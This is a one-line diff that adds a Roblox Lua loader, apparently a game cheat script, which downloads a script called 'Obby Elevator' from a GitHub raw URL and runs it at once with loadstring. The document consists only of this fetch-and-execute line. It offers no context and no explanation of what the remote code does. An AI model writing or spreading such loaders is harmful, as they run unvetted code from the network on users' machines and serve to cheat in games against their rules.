@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shotsontop/Scripts/main/Obby%20Elevator"))()
